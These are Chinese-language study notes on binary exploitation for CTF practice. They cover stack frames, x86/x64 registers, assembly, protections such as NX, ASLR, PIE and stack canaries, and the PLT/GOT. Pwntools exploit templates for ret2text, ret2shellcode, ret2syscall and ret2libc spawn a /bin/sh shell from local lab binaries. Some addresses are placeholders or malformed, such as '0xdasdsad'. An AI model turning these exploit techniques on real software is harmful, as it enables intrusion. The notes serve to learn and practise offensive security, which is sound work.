---
title: PWN
createTime: 2025/04/24 18:35:25
permalink: /studyNotes/dy4sana5/
---
# PWN

## 名词解释

- exploit，攻击脚本
- payload，攻击载荷
- shellcode，将要在服务器执行的shell命令

## GDB

- [gdb调试常用命令](https://blog.csdn.net/weixin_40179091/article/details/109828318)
- PIE绕过调试 b *$rebase(0x933)

## 栈溢出

```markdown
-------------------------
|    局部变量 (40字节)   |
-------------------------
|    保存的rbp (8字节)   |
-------------------------
|    返回地址 (8字节)    |
-------------------------
```

```python
from pwn import *
p=process("./overflow")
#p=remote(IP,端口)
backdoor=0x400677b
payload=b'a'*0x18+p64(backdoor)
p.recvuntil("Your suggestion:\n")
p.sendline(payload)
p.interactive()
```

### Canary绕过

- 格式化字符串绕过canary
- Canary爆破（针对有fork函数的程序）
- Stack smashing
- 劫持__stack_chk_fail

### PIE保护

- partial writing（部分写地址）

## ret2xx

### ret2syscall

- 直接生成ropchain

  > ropper --file inndy_rop --chain execveropper --file inndy_rop --chain execve

# 各种寄存器

## 部分寄存器的功能

- RIP：存放当前执行的指令的地址
- RSP：存放当前战阵的栈顶地址
- RBP：存放当前栈帧的栈底地址
- RAX：通用寄存器。存放函数的返回值

### 通用寄存器 (General-Purpose Registers)

1. **RAX**: 累加寄存器（Accumulator），通常用于算术运算和函数返回值。
2. **RBX**: 基址寄存器（Base Register），通常在访问堆栈数据时使用。
3. **RCX**: 计数寄存器（Count Register），常用于循环和字符串操作。
4. **RDX**: 数据寄存器（Data Register），常用于算术运算和I/O操作。
5. **RSI**: 源索引寄存器（Source Index），通常用于指向源内存地址。
6. **RDI**: 目的地索引寄存器（Destination Index），通常用于指向目标内存地址。
7. **RBP**: 基址指针寄存器（Base Pointer），用于指向当前栈帧的基址。
8. **RSP**: 栈指针寄存器（Stack Pointer），指向当前栈顶。
9. **R8-R15**: 新增的通用寄存器，用于扩展的操作和更多参数传递。

每个64位通用寄存器都有对应的低32位、16位和8位部分：

- 例如，`RAX` 的低32位为 `EAX`，低16位为 `AX`，低8位高字节为 `AH`，低8位低字节为 `AL`。

### 段寄存器 (Segment Registers)

1. **CS**: 代码段寄存器（Code Segment）
2. **DS**: 数据段寄存器（Data Segment）
3. **SS**: 堆栈段寄存器（Stack Segment）
4. **ES**: 附加段寄存器（Extra Segment）
5. **FS**: 附加段寄存器（Extra Segment）
6. **GS**: 附加段寄存器（Extra Segment）

### 特殊用途寄存器 (Special Purpose Registers)

1. **RIP**: 指令指针寄存器（Instruction Pointer），指向下一条将要执行的指令。
2. **RFLAGS**: 标志寄存器（Flags Register），包含条件码和控制标志。

### 浮点寄存器 (Floating Point Registers)

1. **XMM0-XMM15**: 128位的SSE寄存器，用于浮点运算和SIMD（Single Instruction, Multiple Data）操作。
2. **YMM0-YMM15**: 256位的AVX寄存器（只有在支持AVX的处理器上可用）。
3. **ZMM0-ZMM31**: 512位的AVX-512寄存器（只有在支持AVX-512的处理器上可用）。

### 控制寄存器 (Control Registers)

1. **CR0, CR2, CR3, CR4**: 用于控制操作模式和分页机制。
2. **CR8**: 用于APIC（Advanced Programmable Interrupt Controller）优先级控制。·

### 调试寄存器 (Debug Registers)

1. **DR0-DR7**: 用于硬件断点调试。

### 扩展寄存器

1. **K0-K7**: AVX-512专用的掩码寄存器。

# 汇编

- MOV：把源操作数传给目标

- LEA：把源操作数的有效地址送给指定的寄存器

- PUSH：把目标值压栈，同时SP指针-1字长。**高地址往低地址增长**

- POP：出栈，同时SP+1

- LEAVE：在函数返回时，恢复父函数栈帧的指令，

  >  等效于：
  >
  > MOV ESP, EBP
  >
  > POP EBP

- RET：在函数返回时，控制程序执行流返回父函数的指令

  >等效于：
  >
  >POP RIP（不能直接向RIP寄存器传送数据）

# C语言函数调用栈

![image-20240622095534148](https://raw.githubusercontent.com/lrffun/ImageStorage/main/img/image-20240622095534148.png)

- ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。
- EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。
- 函数状态主要涉及三个寄存器 -- esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu依照 sip 的存储内容读取指令并执行，sip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。
- 下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数(caller)的状态保存起来，同时创建被调用函数(callee)的状态。
- 首先将被调用函数(callee)的参数按照逆序依次压入栈内。如果被调用函数(callee)不需要参数，则没有这一步骤。这些参数仍会保存在调用函数(caller)的函数状态内，之后压入栈内的数据都会作为被调用函数(callee)的函状态来保存。
- 再之后是将被调用函数（calle）的局部变量等数据压入栈内。

# ret2text

返回到Text段，后门

### 缓冲区溢出

本质是向定长的缓冲区中写入了超长的数据，造成超出的数据覆盖了合法内存区域。

- 栈溢出
- 堆溢出
- BBS

# 保护措施

## NX保护

- 通过在内存页的标识中增加“执行”位，可以表示该内存页是否可以执行。

## ASLR

- 系统的防护措施，程序装载时生效：

  > - /proc/sys/kernel/randomize_va_space=0：没有随机化。关闭ASLR
  > - /proc/sys/kernel/randomize_va_space=1：保留随机化。共享库、栈、mmap（）以及VDSO被随机化
  > - /proc/sys/kernel/randomize_va_space=2：完全随机化。通过brk分配的内存空间也被随机化
  >
  > 打开：echo 2 > /proc/sys/kernel/randomize_va_space

## PIE

- 用来随机化ERF文件映像

# ret2shellcode

## 获取shellcode

> 条件：checksec检查出可读可写可执行段

### 方法1

```python
from pwn import *

asm(shellcraft.sh()) #默认32位

context.arch = "amd64"
asm(shellcraft.amd64.sh())
```

## 步骤

- 将shellcode注入全局变量Bss
- 控制程序执行流执行到shellcode

### BSS

```python
from pwn import *

buf2 = 0x804a080
payload = asm(shellcraft.sh()).ljust(112, b'A') #ljust：用A补充字符串长度直到112字节
payload  += p32(buf2)
io.sendline(payload)
io.interactive()
```



# 返回导向编程（ROP）

## ret2syscall

> 条件：ROPgadget能够获取到足够的pop ret

- x86通过int 0x80指令进行系统调用，amd64通过syscall进行系统调用

  > eax传入系统调用号，ebx、ecx、edx传三个参数，int 0x80执行系统调用
  >
  > ```python
  > mov eax, 0xb
  > mov ebx, ["/bin/sh"]
  > mov ecx, 0
  > mov edx, 0
  > int 0x80
  > 
  > => execve("/bin/sh", NULL,NULL)0
  > ```

  > 在AMD64（x86-64）架构中，执行 `execve` 系统调用需要使用以下寄存器和参数：
  >
  > 1. **寄存器使用**：
  >    - `rax`：存放系统调用号。对于 `execve` 系统调用，`rax` 的值应该是 `0x3b`，即59（十进制）。
  >    - `rdi`：存放指向以null结尾的字符串数组的指针，即参数 `char *const argv[]`。这些字符串用于传递给新程序作为其命令行参数。
  >    - `rsi`：存放指向以null结尾的环境字符串数组的指针，即参数 `char *const envp[]`。这些字符串用于传递给新程序作为其环境变量。
  > 2. **参数传递**：
  >    - `rdi`：应该是一个指针，指向一个以null结尾的字符串数组，数组中的每个字符串是新程序的命令行参数。通常这个数组的第一个元素是被执行程序的名称。
  >    - `rsi`：同样是一个指针，指向一个以null结尾的字符串数组，数组中的每个字符串是新程序的环境变量。

- gadget

  > ```shell
  > ROPgadget --binary PWN1  --only 'pop|ret' | grep 'edx'
  > ```
  >
  
- 示例exploit

  ```python
  from pwn import *
  
  io = process("")
  
  pop_eax_ret = 0x0000
  pop_edx_ecx_ebx_ret = 0x0123123
  int_80h = 0x031203
  bin_sh = 0x123123
  
  payload = flat([b'A'*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_80h])
  io.sendline(payload)
  io.interactive()
  ```

  

## 动态链接过程

- ldd file：查看程序用到的所有动态连接库

### PLT（Procedure Linkage Table）

1. **作用**：
   - PLT是程序链接表，用于支持动态链接库中的函数调用。
   - 它允许可执行文件或共享库在第一次使用某个符号时，将其解析工作推迟到运行时，而不是编译或链接时。
2. **工作原理**：
   - 当程序第一次调用一个外部函数（例如动态链接库中的函数）时，调用会跳转到PLT表中的对应条目。
   - PLT条目会执行一些代码，这段代码会检查GOT中的相关条目是否已经填充了该函数的地址。
     - 如果没有，PLT条目会调用动态链接器（动态加载器），动态链接器会解析符号并填充GOT中的相关条目。
     - 如果已经填充了，PLT会直接跳转到实际的函数地址。
   - 这样，后续对该函数的调用就可以直接通过GOT获取地址，避免了重复的符号解析。

### GOT（Global Offset Table）

1. **作用**：
   - GOT是全局偏移表，用于保存全局变量和函数的地址**。
   - 在动态链接过程中，GOT用于存储从动态链接库中解析出来的符号地址。
2. **工作原理**：
   - 可执行文件或共享库中的每一次对外部变量或函数的引用都会被指向GOT中的一个条目。
   - 当程序第一次运行时，GOT中的这些条目可能还没有被初始化。
   - 在第一次函数调用时，PLT会触发符号解析，动态链接器会找到实际的地址并写入GOT条目中。
   - 后续的调用会直接使用GOT中记录的地址，避免了重新解析符号。


## ret2libc

- 篡改帧上自返回地址开始的一段区域为一系列gadget的地址，最终调用libc中的函数获取shell。

### ret2libc1

- 通过控制程序执行流执行到plt中的system函数，并在system函数上方两个字节处传递bin/sh

  ```python
  #!/usr/bin/env python
  from pwn import *
  
  sh = process('./ret2libc1')
  
  binsh_addr = 0x8048720
  system_plt = 0x08048460
  payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
  sh.sendline(payload)
  
  sh.interactive()
  ```

  

### ret2libc2

- 没有/bin/sh字符串，控制程序执行令执行到gets方法，输入内容到BSS段，再执行system函数

  ```python
  ##!/usr/bin/env python
  from pwn import *
  
  sh = process('./ret2libc2')
  
  gets_plt = 0x08048460
  system_plt = 0x08048490
  pop_ebx = 0x0804843d
  buf2 = 0x804a080
  payload = flat(
      ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
  sh.sendline(payload)
  sh.sendline('/bin/sh')
  sh.interactive()
  
  ```

  

### ret2libc3

- 没有调用system函数，通过got表泄露puts函数地址，通过libc计算system函数偏移，从而获取system函数地址。

```python
from pwn import *

io = remote()
elf = ELF()
libc = ELF()

io.sendlineafter(b" :", str(elf.got["puts"]))
io.recvuntil(b" : ")
libcBase = int(io.recvuntil(b"\n", drop = True), 16) - libc.symbols["puts"]

success("libcBase -> {:#x}".format(libcBase))
# oneGadget = libcBase + 0x3a80c
# payload = flat(cyclic(60), oneGadget)
payload = flat(cyclic(60), libcBase + libc.symbols["system"], 0xdasdsad, next(elf.search(b"sh\x00")))
io.sendlineafter(b" :", payload)

io.interactive()
```

- one_gadget 可以获取libc直接执行/bin/sh的代码片段偏移

  > constrains是调用该gadget的条件